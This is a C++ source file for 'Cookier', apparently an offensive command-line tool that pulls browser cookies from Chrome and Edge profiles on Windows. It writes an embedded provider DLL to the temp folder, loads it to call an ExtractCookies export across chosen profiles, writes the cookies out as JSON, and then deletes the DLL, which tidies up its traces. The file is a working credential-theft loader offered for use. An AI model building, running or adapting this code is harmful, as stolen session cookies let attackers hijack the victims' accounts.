#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include "Cookier.h"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

typedef bool (*ExtractCookiesFunc)(char**, const char*, const char*, bool);

static std::string Narrow(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), out.data(), n, nullptr, nullptr);
    return out;
}

// Prefix every line except the first with the given indent (so caller can prepend a key on line 1).
static std::string IndentLines(const std::string& s, const std::string& prefix) {
    std::string result;
    result.reserve(s.size() + s.size() / 8 + 64);
    bool atLineStart = false;
    for (char c : s) {
        if (atLineStart && c != '\n') result += prefix;
        result += c;
        atLineStart = (c == '\n');
    }
    return result;
}

int wmain(int argc, wchar_t* argv[]) {
    std::string browser = "", outPath = "", profileList = "Default";
    bool verbose = false;

    for (int i = 1; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"--version") { std::cout << "Cookier v0.0.2\n"; return 0; }
        if (arg == L"--help" || arg == L"-h") {
            std::cout << "Usage: Cookier.exe --browser chrome/edge/all [--profile name1,name2/all] [--output file.json] [--verbose] [--version]\n";
            std::cout << "  Default: JSON to stdout. Use --output <file> to save to a file.\n";
            return 0;
        }
        if (arg == L"--browser" || arg == L"-b") { if (i + 1 < argc) browser = Narrow(argv[++i]); }
        if (arg == L"--profile" || arg == L"-p") {
            std::vector<std::string> profiles; int j = i + 1;
            while (j < argc && argv[j][0] != L'-') { profiles.push_back(Narrow(argv[j])); j++; }
            profileList = "";
            for (size_t k = 0; k < profiles.size(); ++k) profileList += profiles[k] + (k == profiles.size() - 1 ? "" : ",");
            i = j - 1;
        }
        if (arg == L"--output" || arg == L"-o") { if (i + 1 < argc) outPath = Narrow(argv[++i]); }
        if (arg == L"--verbose" || arg == L"-v") verbose = true;
    }

    if (browser.empty()) return 0;

    std::vector<std::string> targets;
    if (browser == "all") { std::cerr << "[*] Extracting from all supported browsers...\n"; targets = {"chrome", "edge"}; }
    else if (browser == "chrome" || browser == "edge") { targets = {browser}; }
    else { std::cerr << "[!] Unsupported browser: " << browser << "\n"; return 1; }

    wchar_t tempPath[MAX_PATH]; GetTempPathW(MAX_PATH, tempPath);
    std::wstring dllPath = std::wstring(tempPath) + L"Cookier_Provider_Chromium_" + std::to_wstring(GetCurrentProcessId()) + L".dll";
    DeleteFileW(dllPath.c_str());

    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(100), MAKEINTRESOURCEW(10));
    if (!hRes) { std::cerr << "[!] Failed to find embedded Chromium provider.\n"; return 1; }
    HGLOBAL hMem = LoadResource(NULL, hRes); void* pData = LockResource(hMem); DWORD size = SizeofResource(NULL, hRes);
    std::ofstream out(dllPath, std::ios::binary); out.write((char*)pData, size); out.close();

    HMODULE hProvider = LoadLibraryW(dllPath.c_str());
    if (!hProvider) { std::cerr << "[!] Failed to load Chromium provider. Error: " << GetLastError() << "\n"; return 1; }

    ExtractCookiesFunc extractFunc = (ExtractCookiesFunc)GetProcAddress(hProvider, "ExtractCookies");
    if (!extractFunc) { std::cerr << "[!] Failed to find ExtractCookies.\n"; FreeLibrary(hProvider); return 1; }

    std::vector<std::pair<std::string, std::string>> results;
    for (auto& b : targets) {
        std::cerr << "[*] Extracting cookies from " << b << " (Profiles: " << profileList << ")...\n";
        char* json = nullptr;
        if (extractFunc(&json, b.c_str(), profileList.c_str(), verbose) && json) {
            results.push_back({b, std::string(json)});
            CoTaskMemFree(json);
        } else {
            std::cerr << "[!] " << b << " extraction failed.\n";
        }
    }

    FreeLibrary(hProvider); DeleteFileW(dllPath.c_str());
    if (results.empty()) return 1;

    std::string output;
    if (results.size() == 1) {
        output = results[0].second;
    } else {
        output = "{\n";
        for (size_t i = 0; i < results.size(); i++) {
            if (i > 0) output += ",\n";
            output += "  \"" + results[i].first + "\": " + IndentLines(results[i].second, "  ");
        }
        output += "\n}";
    }

    if (outPath.empty()) std::cout << output << std::endl;
    else {
        std::ofstream f(outPath);
        if (f) { f << output; std::cerr << "[+] Saved cookies to " << outPath << "\n"; }
        else { std::cerr << "[!] Cannot open output file: " << outPath << "\n"; return 1; }
    }
    return 0;
}